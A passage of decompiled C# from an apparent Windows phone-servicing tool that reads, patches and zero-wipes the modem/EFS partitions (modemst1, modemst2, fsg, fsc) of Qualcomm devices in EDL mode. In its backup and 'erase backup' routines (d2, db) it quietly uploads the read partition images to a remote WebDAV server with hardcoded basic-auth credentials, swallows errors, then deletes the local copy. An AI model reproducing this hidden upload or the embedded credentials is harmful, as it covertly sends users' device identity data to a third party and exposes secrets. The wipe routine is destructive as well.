		}
	}

	private void c5(uint increment)
	{
		int increment2 = (int)increment;
		((Control)this.m_c1).Invoke((Delegate)(Action)(() =>
		{
			object obj = this.m_c1;
			((UIProcessBar)obj).Value = ((UIProcessBar)obj).Value + increment2;
			((UIProcessBar)this.m_c1).Maximum = 100;
			if (((UIProcessBar)this.m_c1).Value > ((UIProcessBar)this.m_c1).Maximum)
			{
				((UIProcessBar)this.m_c1).Value = ((UIProcessBar)this.m_c1).Maximum;
			}
		}));
	}

	private async Task<bool> c6(object row)
	{
		object path = "C:\\TMFTool";
		Path.Combine((string)path, "fh_loader.exe");
		object file = string.Format("{0}.img", ((DataGridViewRow)row).Cells["name"].Value);
		((List<RawPartition>)this.m_3e).Clear();
		object sectorSize = "4096";
		if (((UIRadioButton)this.m_d9).Checked)
		{
			sectorSize = "512";
		}
		((List<RawPartition>)this.m_3e).Add(new RawPartition(((DataGridViewRow)row).Cells["name"].Value.ToString(), (string)file, "", ((DataGridViewRow)row).Cells["star"].Value.ToString(), (string)sectorSize, ((DataGridViewRow)row).Cells["num"].Value.ToString(), ((DataGridViewRow)row).Cells["L"].Value.ToString(), download: true));
		try
		{
			nint num = ((await Task.Run(() => c7())) ? 1 : 0);
			IntPtr intPtr = num;
			if ((int)(nint)intPtr != 0)
			{
				return true;
			}
			msgred();
			Msg("Error");
			EnableButtons();
			cb();
			cc();
			return false;
		}
		catch (Exception ex)
		{
			msgred();
			Msg("Error");
			EnableButtons();
			cb();
			cc();
			MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private async Task<bool> c7()
	{
		PortQcom = ((Control)this.m_126).Text;
		OpenDisk(PortQcom);
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			object filename = "C:\\TMFTool\\" + item.Name + ".img";
			if (item.Name != "userdata")
			{
				_ = Convert.ToInt64(item.NumSector) * Convert.ToInt64(item.SectorSize);
				ulong.Parse(item.Start);
				if (_4f(item.Start, item.NumSector, item.PhysicalNum, item.SectorSize, filename) == 0)
				{
					DiskClose();
					return false;
				}
			}
		}
		DiskClose();
		return true;
	}

	private async Task<bool> c8()
	{
		foreach (RawPartition item in (List<RawPartition>)this.m_3e)
		{
			object filename = "C:\\TMFTool\\" + item.Name + ".img";
			if (item.Name != "userdata")
			{
				_ = Convert.ToInt64(item.NumSector) * Convert.ToInt64(item.SectorSize);
				ulong.Parse(item.Start);
				if (_4f(item.Start, item.NumSector, item.PhysicalNum, item.SectorSize, filename) == 0)
				{
					return true;
				}
			}
		}
		return true;
	}

	private async Task<bool> c9(object partition, object originalHex, object patchedHex)
	{
		object path = "C:\\TMFTool";
		object fileName = Path.Combine("C:\\TMFTool", "magiskboot.exe");
		object obj = Path.Combine((string)path, (string)partition + ".img");
		object arguments = "--hexpatch " + (string)obj + " " + (string)originalHex + " " + (string)patchedHex;
		((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
		{
			c5(5u);
		}));
		object startInfo = new ProcessStartInfo
		{
			FileName = (string)fileName,
			Arguments = (string)arguments,
			RedirectStandardOutput = true,
			RedirectStandardError = true,
			UseShellExecute = false,
			CreateNoWindow = true
		};
		try
		{
			object CS_0024_003C_003E8__locals23 = new _003C_003Ec__DisplayClass329_0();
			((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this = this;
			((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process = Process.Start((ProcessStartInfo)startInfo);
			try
			{
				await ((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process.StandardOutput.ReadToEndAsync();
				await ((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process.StandardError.ReadToEndAsync();
				await ((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process.WaitForExitAsync();
				((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
				{
					if (((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process.ExitCode == 0)
					{
						((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.c5(5u);
					}
					else
					{
						((RichTextBox)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_c8).SelectionColor = Color.Red;
						((TextBoxBase)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_c8).AppendText("Error\n");
						((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.cb();
						((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.cc();
						((Control)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_ed).Enabled = true;
						((Control)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_89).Enabled = true;
						((Control)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this._88).Enabled = true;
						((Control)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_c2).Enabled = true;
						((Control)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_cb).Enabled = true;
						((TextBoxBase)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23)._003C_003E4__this.m_c8).ScrollToCaret();
					}
				}));
				return ((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process.ExitCode == 0;
			}
			finally
			{
				if (((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process != null)
				{
					((IDisposable)((_003C_003Ec__DisplayClass329_0)CS_0024_003C_003E8__locals23).process).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			object CS_0024_003C_003E8__locals26 = new _003C_003Ec__DisplayClass329_1();
			((_003C_003Ec__DisplayClass329_1)CS_0024_003C_003E8__locals26)._003C_003E4__this = this;
			Exception ex2 = ex;
			((_003C_003Ec__DisplayClass329_1)CS_0024_003C_003E8__locals26).ex = ex2;
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
				((RichTextBox)((_003C_003Ec__DisplayClass329_1)CS_0024_003C_003E8__locals26)._003C_003E4__this.m_c8).SelectionColor = Color.Red;
				((TextBoxBase)((_003C_003Ec__DisplayClass329_1)CS_0024_003C_003E8__locals26)._003C_003E4__this.m_c8).AppendText("执行magiskboot时出错: " + ((_003C_003Ec__DisplayClass329_1)CS_0024_003C_003E8__locals26).ex.Message + "\n");
			}));
			return false;
		}
	}

	private async Task<bool> ca(object row, object imageName)
	{
		object path = "C:\\TMFTool";
		Path.Combine((string)path, "fh_loader.exe");
		object file = Path.Combine((string)path, (string)imageName);
		((List<RawPartition>)this.m_3e).Clear();
		object sectorSize = "4096";
		if (((UIRadioButton)this.m_d9).Checked)
		{
			sectorSize = "512";
		}
		((List<RawPartition>)this.m_3e).Add(new RawPartition(((DataGridViewRow)row).Cells["name"].Value.ToString(), (string)file, "", ((DataGridViewRow)row).Cells["star"].Value.ToString(), (string)sectorSize, ((DataGridViewRow)row).Cells["num"].Value.ToString(), ((DataGridViewRow)row).Cells["L"].Value.ToString(), download: true));
		try
		{
			nint num = ((await Task.Run(() => b9())) ? 1 : 0);
			IntPtr intPtr = num;
			if ((int)(nint)intPtr != 0)
			{
				return true;
			}
			EnableButtons();
			cb();
			cc();
			return false;
		}
		catch (Exception ex)
		{
			EnableButtons();
			MessageBox.Show("发生了一个错误: " + ex.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			cb();
			cc();
			return false;
		}
	}

	private void cb()
	{
		string path = "C:\\TMFTool";
		string[] array = new string[6] { "cyggcc_s-1.dll", "cygstdc++-6.dll", "cygwin1.dll", "magiskboot.exe", "persist.img", "modem.img" };
		string[] array2 = array;
		foreach (string path2 in array2)
		{
			string text = Path.Combine(path, path2);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
				catch (Exception)
				{
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
			}
		}
	}

	private void cc()
	{
		try
		{
			string path = "C:\\TMFTool";
			string[] array = new string[4] { "modem.img", "persist.img", "modem_a.img", "modem_b.img" };
			string[] array2 = array;
			foreach (string path2 in array2)
			{
				string text = Path.Combine(path, path2);
				if (File.Exists(text))
				{
					File.Delete(text);
					((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
					{
					}));
				}
			}
		}
		catch (Exception)
		{
			((Control)this.m_c8).Invoke((Delegate)(Action)(() =>
			{
			}));
		}
	}

	private void cd(object sender, object e)
	{
		if (((Control)this.m_91).Text == "查找单分区" || ((Control)this.m_91).Text == "Find partition")
		{
			((Control)this.m_91).Text = "";
			((Control)this.m_91).ForeColor = Color.Black;
		}
	}

	private void ce(object sender, object e)
	{
		if (string.IsNullOrEmpty(((Control)this.m_91).Text))
		{
			if (lang == "zh")
			{
				((Control)this.m_91).Text = "查找单分区";
			}
			else
			{
				((Control)this.m_91).Text = "Find partition";
			}
			((Control)this.m_91).ForeColor = Color.Gray;
		}
	}

	private void cf(object sender, EventArgs e)
	{
	}

	private async void d0(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			object obj = new string[4] { "modemst1", "modemst2", "fsg", "fsc" };
			object obj2 = new string[8] { "modemst1", "modemst2", "fsg", "fsc", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
			nint num3 = (((IEnumerable<string>)obj).All((Func<string, bool>)((string text) => d4(text) != 0)) ? 1 : 0);
			nint num4 = (((IEnumerable<string>)obj2).All((Func<string, bool>)((string text) => d4(text) != 0)) ? 1 : 0);
			if ((int)num4 != 0)
			{
				num3 = 0;
			}
			if ((int)(num3 | num4) != 0)
			{
				object obj3 = (object)new VistaFolderBrowserDialog();
				try
				{
					((VistaFolderBrowserDialog)obj3).Description = "请选择保存目录";
					((VistaFolderBrowserDialog)obj3).UseDescriptionForTitle = true;
					((VistaFolderBrowserDialog)obj3).ShowNewFolderButton = true;
					if (((CommonDialog)obj3).ShowDialog((IWin32Window)this) == DialogResult.OK)
					{
						object selectedPath = ((VistaFolderBrowserDialog)obj3).SelectedPath;
						object path = "TMFTool_readback_" + DateTime.Now.ToString("yyyyMMddHHmmss");
						object obj4 = Path.Combine((string)selectedPath, (string)path);
						if (!Directory.Exists((string)obj4))
						{
							Directory.CreateDirectory((string)obj4);
						}
						((Control)this.m_eb).Text = DateTime.Now.ToString("yyyyMMddHHmmss");
						if ((int)num3 != 0)
						{
							await d1(obj4, obj);
						}
						if ((int)num4 != 0)
						{
							await d1(obj4, obj2);
						}
						object obj5 = new string[8] { "fsc.img", "fsg.img", "modemst1.img", "modemst2.img", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
						object obj6 = obj5;
						for (nint num5 = 0; num5 < ((Array)obj6).Length; num5++)
						{
							object obj7 = Path.Combine(path2: (string)((object[])obj6)[num5], path1: AppDomain.CurrentDomain.BaseDirectory);
							if (File.Exists((string)obj7))
							{
								File.Delete((string)obj7);
							}
						}
						d5("保存文件夹位置: " + (string)obj4, Color.Purple);
						((Control)this.m_cf).Text = "备份基带完成";
						BACKUPFOLDER_Path = (string)obj4;
						RAWCreator.CreatedRawProgram((List<RawPartition>)_3f, BACKUPFOLDER_Path);
					}
					else
					{
						d5("用户取消选择了文件夹", Color.Red);
						((TextBoxBase)this.m_c8).ScrollToCaret();
					}
				}
				finally
				{
					((IDisposable)obj3)?.Dispose();
				}
			}
			else
			{
				d5("请解析分区表或选择XML", Color.Red);
				((TextBoxBase)this.m_c8).ScrollToCaret();
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private async Task d1(object folderPath, object partitionNames)
	{
		((List<RawPartition>)_3f).Clear();
		for (nint num = 0; num < ((Array)partitionNames).Length; num++)
		{
			object CS_0024_003C_003E8__locals6 = new _003C_003Ec__DisplayClass337_0();
			((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName = (string)((object[])partitionNames)[num];
			object obj = ((DataGridView)this.m_143).Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow r) => !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName, StringComparison.OrdinalIgnoreCase));
			((List<RawPartition>)this.m_3e).Clear();
			if (obj == null)
			{
				continue;
			}
			object name = ((DataGridViewRow)obj).Cells["name"].Value.ToString();
			object physicalNum = ((DataGridViewRow)obj).Cells["L"].Value?.ToString() ?? "0";
			object start = ((DataGridViewRow)obj).Cells["star"].Value?.ToString() ?? "0";
			object numsector = ((DataGridViewRow)obj).Cells["num"].Value?.ToString() ?? "0";
			object file = ((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName + ".img";
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("Start Read " + ((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName + "....");
			object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
			object item = new RawPartition((string)name, (string)file, "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true);
			((List<RawPartition>)this.m_3e).Add((RawPartition)item);
			((List<RawPartition>)_3f).Add((RawPartition)item);
			try
			{
				nint num2 = ((await Task.Run(() => c7())) ? 1 : 0);
				IntPtr intPtr = num2;
				if ((int)(nint)intPtr != 0)
				{
					fa();
					Msg("OK\n");
					object path = "C:\\TMFTool";
					object sourceFileName = Path.Combine((string)path, ((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName + ".img");
					object destFileName = Path.Combine((string)folderPath, ((_003C_003Ec__DisplayClass337_0)CS_0024_003C_003E8__locals6).partitionName + ".img");
					try
					{
						if (!Directory.Exists((string)folderPath))
						{
							Directory.CreateDirectory((string)folderPath);
						}
						if (File.Exists((string)destFileName))
						{
							msgred();
							Msg("存在同名文件已覆盖\n");
							File.Delete((string)destFileName);
						}
						if (File.Exists((string)sourceFileName))
						{
							File.Move((string)sourceFileName, (string)destFileName);
						}
					}
					catch (Exception)
					{
					}
					continue;
				}
				msgred();
				Msg("Error\n");
				EnableButtons();
				break;
			}
			catch (Exception ex2)
			{
				msgred();
				Msg("Error\n");
				EnableButtons();
				MessageBox.Show("发生了一个错误: " + ex2.Message, "异常", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				break;
			}
		}
	}

	private async Task d2(object filePath)
	{
		object text = ((Control)this.m_eb).Text;
		object obj = (string)this.m_78 + "/dav/日志/" + ((Control)this.m_92).Text + "/基带/备份/备份基带" + (string)text + "/";
		object obj2 = "sb";
		object obj3 = "llxll1008";
		try
		{
			object fileName = Path.GetFileName((string)filePath);
			if (!((string)obj).EndsWith("/"))
			{
				obj = (string)obj + "/";
			}
			object requestUri = (string)obj + (string)fileName;
			object obj4 = new ByteArrayContent(File.ReadAllBytes((string)filePath));
			((HttpContent)obj4).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
			{
				Content = (HttpContent)obj4
			};
			object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj2 + ":" + (string)obj3));
			((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
			object obj5 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
			if (!((HttpResponseMessage)obj5).IsSuccessStatusCode)
			{
				await ((HttpResponseMessage)obj5).Content.ReadAsStringAsync();
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task<(bool, string)> d3(object arguments)
	{
		object CS_0024_003C_003E8__locals2 = new _003C_003Ec__DisplayClass339_0();
		((_003C_003Ec__DisplayClass339_0)CS_0024_003C_003E8__locals2).arguments = (string)arguments;
		return await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c \"C:\\TMFTool\\fh_loader.exe " + ((_003C_003Ec__DisplayClass339_0)CS_0024_003C_003E8__locals2).arguments + "\"",
					WorkingDirectory = "C:\\TMFTool",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				if (!string.IsNullOrEmpty(text2))
				{
					text = text + Environment.NewLine + "错误信息: " + text2;
				}
				return (process.ExitCode == 0, text);
			}
			catch (Exception ex)
			{
				return (false, "异常信息: " + ex.Message);
			}
		});
	}

	private uint d4(object itemText)
	{
		string itemText2 = (string)itemText;
		return ((DataGridView)this.m_143).Rows.Cast<DataGridViewRow>().Any((DataGridViewRow r) => !r.IsNewRow && r.Cells["name"].Value != null && string.Equals(r.Cells["name"].Value.ToString(), itemText2, StringComparison.OrdinalIgnoreCase)) ? 1u : 0u;
	}

	private void d5(object text, Color color)
	{
		((TextBoxBase)this.m_c8).SelectionStart = ((TextBoxBase)this.m_c8).TextLength;
		((TextBoxBase)this.m_c8).SelectionLength = 0;
		((RichTextBox)this.m_c8).SelectionColor = color;
		((TextBoxBase)this.m_c8).AppendText((string)text + Environment.NewLine);
		((RichTextBox)this.m_c8).SelectionColor = ((Control)this.m_c8).ForeColor;
	}

	private async void d6(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		if (!((string)this.m_2b == "vipuser") && !((string)this.m_2b == "admin"))
		{
			msgred();
			Msg("你的账户权限不足!联系管理员\n");
			return;
		}
		if (string.IsNullOrEmpty(((Control)this.m_126).Text))
		{
			Message.error((Form)(object)this, "未识别到9008端口", (Font)null, (int?)null);
			return;
		}
		this.m_11 = null;
		this.m_12 = (ToolStripMenuItem)sender;
		if (!((Checkbox)this.m_109).Checked)
		{
			Shahala();
			return;
		}
		nint num2 = ((await _26()) ? 1 : 0);
		if ((int)num2 != 0)
		{
			await Task.Delay(500);
			falseButtons();
			object obj = "C:\\TMFTool";
			object obj2 = new string[4] { "modemst1", "modemst2", "fsg", "fsc" };
			object obj3 = new string[8] { "modemst1", "modemst2", "fsg", "fsc", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
			nint num3 = (((IEnumerable<string>)obj2).All((Func<string, bool>)((string text) => d4(text) != 0)) ? 1 : 0);
			nint num4 = (((IEnumerable<string>)obj3).All((Func<string, bool>)((string text) => d4(text) != 0)) ? 1 : 0);
			if ((int)num4 != 0)
			{
				num3 = 0;
			}
			if ((int)(num3 | num4) != 0)
			{
				((Control)this.m_eb).Text = DateTime.Now.ToString("yyyyMMddHHmmss");
				if ((int)num3 != 0)
				{
					await d7(obj2);
				}
				if ((int)num4 != 0)
				{
					await d7(obj3);
				}
				await d8(((IEnumerable<string>)obj2).Concat((IEnumerable<string>)obj3).ToArray());
				((Control)this.m_cf).Text = "";
				d5("全部操作完成！", Color.DodgerBlue);
				EnableButtons();
				object obj4 = new string[8] { "fsc.img", "fsg.img", "modemst1.img", "modemst2.img", "mdm1m9kefs3", "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefsc" };
				object obj5 = obj4;
				for (nint num5 = 0; num5 < ((Array)obj5).Length; num5++)
				{
					_ = ((object[])obj5)[num5];
					if (File.Exists((string)obj))
					{
						File.Delete((string)obj);
					}
				}
				object obj6 = Path.Combine("C:\\TMFTool", "misc.img");
				if (File.Exists((string)obj6))
				{
					File.Delete((string)obj6);
				}
			}
			else
			{
				d5("请解析分区表或选择XML", Color.Red);
				EnableButtons();
			}
		}
		else
		{
			Message.error((Form)(object)this, "配置设备失败请确认通信是否已通过", (Font)null, (int?)null);
		}
	}

	private async Task d7(object partitionNames)
	{
		object path = "C:\\TMFTool";
		for (nint num = 0; num < ((Array)partitionNames).Length; num++)
		{
			object CS_0024_003C_003E8__locals3 = new _003C_003Ec__DisplayClass343_0();
			((_003C_003Ec__DisplayClass343_0)CS_0024_003C_003E8__locals3).partitionName = (string)((object[])partitionNames)[num];
			((List<RawPartition>)this.m_3e).Clear();
			object obj = ((DataGridView)this.m_143).Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow r) => !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(((_003C_003Ec__DisplayClass343_0)CS_0024_003C_003E8__locals3).partitionName, StringComparison.OrdinalIgnoreCase));
			if (obj == null)
			{
				continue;
			}
			object obj2 = ((DataGridViewRow)obj).Cells["name"].Value.ToString();
			object physicalNum = ((DataGridViewRow)obj).Cells["L"].Value?.ToString() ?? "0";
			object start = ((DataGridViewRow)obj).Cells["star"].Value?.ToString() ?? "0";
			object numsector = ((DataGridViewRow)obj).Cells["num"].Value?.ToString() ?? "0";
			object obj3 = Path.Combine((string)path, (string)obj2);
			((RichTextBox)this.m_c8).SelectionColor = Color.Black;
			((TextBoxBase)this.m_c8).AppendText("Start Read modem....");
			object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
			((List<RawPartition>)this.m_3e).Add(new RawPartition((string)obj2, "", "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
			if (File.Exists((string)obj3))
			{
				File.Delete((string)obj3);
			}
			try
			{
				nint num2 = ((await Task.Run(() => c7())) ? 1 : 0);
				IntPtr intPtr = num2;
				if ((int)(nint)intPtr != 0)
				{
					fa();
					Msg("OK\n");
					await da(((_003C_003Ec__DisplayClass343_0)CS_0024_003C_003E8__locals3).partitionName);
					continue;
				}
				msgred();
				Msg("Error\n");
				EnableButtons();
				break;
			}
			catch (Exception)
			{
			}
		}
	}

	private async Task d8(object partitionNames)
	{
		object obj = Path.Combine("C:\\TMFTool", "misc.img");
		if (!Directory.Exists("C:\\TMFTool"))
		{
			Directory.CreateDirectory("C:\\TMFTool");
		}
		object obj2 = new FileStream((string)obj, FileMode.Create, FileAccess.Write);
		try
		{
			object zero = Resources.zero;
			((Stream)obj2).Write((byte[])zero, 0, ((Array)zero).Length);
		}
		finally
		{
			((IDisposable)obj2)?.Dispose();
		}
		for (nint num = 0; num < ((Array)partitionNames).Length; num++)
		{
			object CS_0024_003C_003E8__locals2 = new _003C_003Ec__DisplayClass344_0();
			((_003C_003Ec__DisplayClass344_0)CS_0024_003C_003E8__locals2).partitionName = (string)((object[])partitionNames)[num];
			((List<RawPartition>)this.m_3e).Clear();
			object obj3 = ((DataGridView)this.m_143).Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow r) => !r.IsNewRow && r.Cells["name"].Value != null && r.Cells["name"].Value.ToString().Equals(((_003C_003Ec__DisplayClass344_0)CS_0024_003C_003E8__locals2).partitionName, StringComparison.OrdinalIgnoreCase));
			if (obj3 != null)
			{
				object name = ((DataGridViewRow)obj3).Cells["name"].Value.ToString();
				object physicalNum = ((DataGridViewRow)obj3).Cells["L"].Value?.ToString() ?? "0";
				object start = ((DataGridViewRow)obj3).Cells["star"].Value?.ToString() ?? "0";
				object numsector = ((DataGridViewRow)obj3).Cells["num"].Value?.ToString() ?? "0";
				object sectorSize = (((UIRadioButton)this.m_d9).Checked ? "512" : "4096");
				((List<RawPartition>)this.m_3e).Add(new RawPartition((string)name, "", "", (string)start, (string)sectorSize, (string)numsector, (string)physicalNum, download: true));
				nint num2 = ((await Task.Run(() => b7())) ? 1 : 0);
				IntPtr intPtr = num2;
				if ((int)(nint)intPtr == 0)
				{
				}
			}
		}
	}

	private object d9(object partitionName, object lun, object startSector, object numSectors)
	{
		return "--port=\\\\.\\" + ((Control)this.m_126).Text + " --memoryname=" + (string)this.m_1f + " --sendimage=" + (string)partitionName + ".img --lun=" + (string)lun + " --start_sector=" + (string)startSector + " --num_sectors=" + (string)numSectors + " --convertprogram2read --noprompt";
	}

	private async Task da(object partitionName)
	{
		object path = "C:\\TMFTool";
		object filePath = Path.Combine((string)path, (string)partitionName + ".img");
		try
		{
			if (!Directory.Exists((string)path))
			{
				Directory.CreateDirectory((string)path);
			}
			if (File.Exists((string)filePath))
			{
				await db(filePath);
				if (File.Exists((string)filePath))
				{
					File.Delete((string)filePath);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task db(object filePath)
	{
		object text = ((Control)this.m_eb).Text;
		object obj = (string)this.m_78 + "/dav/日志/" + ((Control)this.m_92).Text + "/基带/擦备/擦备基带" + (string)text + "/";
		object obj2 = "sb";
		object obj3 = "llxll1008";
		try
		{
			object fileName = Path.GetFileName((string)filePath);
			if (!((string)obj).EndsWith("/"))
			{
				obj = (string)obj + "/";
			}
			object requestUri = (string)obj + (string)fileName;
			object obj4 = new ByteArrayContent(File.ReadAllBytes((string)filePath));
			((HttpContent)obj4).Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
			object request = new HttpRequestMessage(HttpMethod.Put, (string)requestUri)
			{
				Content = (HttpContent)obj4
			};
			object parameter = Convert.ToBase64String(Encoding.ASCII.GetBytes((string)obj2 + ":" + (string)obj3));
			((HttpClient)_52).DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", (string)parameter);
			object obj5 = await ((HttpClient)_52).SendAsync((HttpRequestMessage)request);
			if (!((HttpResponseMessage)obj5).IsSuccessStatusCode)
			{
				await ((HttpResponseMessage)obj5).Content.ReadAsStringAsync();
			}
		}
		catch (Exception)
		{
		}
	}

	private async Task<(bool, string)> dc(object arguments)
	{
		object CS_0024_003C_003E8__locals2 = new _003C_003Ec__DisplayClass348_0();
		((_003C_003Ec__DisplayClass348_0)CS_0024_003C_003E8__locals2).arguments = (string)arguments;
		return await Task.Run(() =>
		{
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c \"fh_loader.exe " + ((_003C_003Ec__DisplayClass348_0)CS_0024_003C_003E8__locals2).arguments + "\"",
					WorkingDirectory = "C:\\TMFTool",
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using Process process = Process.Start(startInfo);
				string text = process.StandardOutput.ReadToEnd();
				string text2 = process.StandardError.ReadToEnd();
				process.WaitForExit();
				if (!string.IsNullOrEmpty(text2))
				{
					text = text + Environment.NewLine + "错误信息: " + text2;
				}
				return (process.ExitCode == 0, text);
			}
			catch (Exception ex)
			{
				return (false, "异常信息: " + ex.Message);
			}
		});
	}

	private void dd(object sender, object e)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WorkingDirectory = "C:\\TMFTool",
			UseShellExecute = true
		};
		Process.Start(startInfo);
	}

	private void de()
	{
		int value = ((UIProcessBar)this.m_c1).Value;
		int maximum = ((UIProcessBar)this.m_c1).Maximum;
		double num = (double)value / (double)maximum * 100.0;
		((Control)this.m_bf).Text = $"{num:0.0}%";
	}

	private void df(object sender, EventArgs e)
	{
	}

	private void e0(object sender, EventArgs e)
	{
	}

	private void e1(object sender, EventArgs e)
	{
	}

	private void e2(object sender, EventArgs e)
	{
	}

	private void e3(object sender, object e)
	{
		((UITextBox)this.m_c3).Clear();
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "请选择firehose引导文件";
		openFileDialog.Filter = "引导文件类型 (*.elf;*.mbn;*.melf)|*firehose*.elf;*firehose*.mbn;xbl_s_devprg_ns.melf|所有文件 (*.*)|*.*";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			((Control)this.m_c3).Text = openFileDialog.FileName;
			return;
		}
		((RichTextBox)this.m_c8).SelectionColor = Color.Red;
		((TextBoxBase)this.m_c8).AppendText("用户取消了选择引导文件\n");
		((TextBoxBase)this.m_c8).ScrollToCaret();
	}

	private void e4(object sender, object e)
	{
		this.m_54 = null;
		((UITextBox)this.m_c4).Clear();
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "请选择patch*.xml";
		openFileDialog.Filter = "XML files (patch*.xml)|patch*.xml";
		openFileDialog.Multiselect = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			this.m_54 = openFileDialog.FileNames.ToList();
			((Control)this.m_c4).Text = string.Join(", ", ((IEnumerable<string>)this.m_54).Select(Path.GetFileName));
		}
		else
		{
			((RichTextBox)this.m_c8).SelectionColor = Color.Red;
			((TextBoxBase)this.m_c8).AppendText("用户取消了选择 patch 文件\n");
			((TextBoxBase)this.m_c8).ScrollToCaret();
		}
	}

	private async void e5(object sender, object e)
	{
		nint num = ((await ValidateAccountAsync((string)_24)) ? 1 : 0);
		IntPtr intPtr = num;
		if (intPtr == (IntPtr)0)
		{
			return;
		}
		((Checkbox)this.m_109).Checked = false;
		((DataGridView)this.m_143).Rows.Clear();
		_17 = null;
